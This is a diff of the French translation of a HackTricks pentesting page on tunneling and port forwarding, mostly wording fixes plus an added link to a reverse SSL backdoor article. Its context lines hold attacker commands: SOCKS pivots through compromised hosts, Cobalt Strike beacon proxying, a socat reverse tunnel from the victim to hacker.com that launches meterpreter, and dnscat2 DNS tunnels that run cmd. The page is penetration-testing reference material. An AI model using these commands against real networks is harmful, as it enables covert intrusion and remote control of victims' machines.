@@ -1,11 +1,11 @@
-# Tunneling et Port Forwarding
+# Tunneling et Redirection de Port
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Astuce Nmap
 
 > [!WARNING]
-> Les scans **ICMP** et **SYN** ne peuvent pas être tunnélisés à travers des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier les **scans TCP** (`-sT`) pour que cela fonctionne.
+> Les scans **ICMP** et **SYN** ne peuvent pas être tunnélisés à travers des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier des **scans TCP** (`-sT`) pour que cela fonctionne.
 
 ## **Bash**
 
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Port local --> Hôte compromis (SSH) --> N'importe où
+Port local --> Hôte compromis (SSH) --> Partout
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### Proxy SOCKS
 
-Ouvrez un port dans le teamserver écoutant sur toutes les interfaces qui peut être utilisé pour **router le trafic à travers le beacon**.
+Ouvrez un port dans le teamserver écoutant sur toutes les interfaces qui peuvent être utilisées pour **router le trafic à travers le beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Liaison et Écoute de l'Agent
+### Liaison et Écoute
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivoter à travers **NTLM proxy**
+Pivot through **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -286,10 +286,12 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### Tunnel SSL Socat
 
 **/bin/sh console**
@@ -344,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Vous devez avoir **un accès RDP sur le système**.\
 Téléchargez :
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité de Service de Bureau à Distance de Windows. DVC est responsable de **tunneling des paquets sur la connexion RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **l'acheminement des paquets sur la connexion RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
@@ -352,7 +354,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **nous connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et qu'il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -362,13 +364,13 @@ Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'é
 ```
 netstat -antb | findstr 1080
 ```
-Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**
+Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxyfier le trafic à travers ce port.**
 
-## Proxifier les applications GUI Windows
+## Proxyfier les applications GUI Windows
 
 Vous pouvez faire naviguer les applications GUI Windows à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
 Dans **Profile -> Proxy Servers**, ajoutez l'IP et le port du serveur SOCKS.\
-Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions aux IP que vous souhaitez proxifier.
+Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxyfier et les connexions aux IP que vous souhaitez proxyfier.
 
 ## Contournement du proxy NTLM
 
@@ -428,12 +430,12 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **Dans PowerShell**
 
-Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans powershell :
+Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans PowerShell :
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Transfert de port avec dnscat**
+#### **Redirection de port avec dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
@@ -478,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-&#xNAN;_&#x45;xposition URI sont comme:_ **UID.ngrok.io**
+_&#x45;xposition URI sont comme:_ **UID.ngrok.io**
 
 ### Installation
 
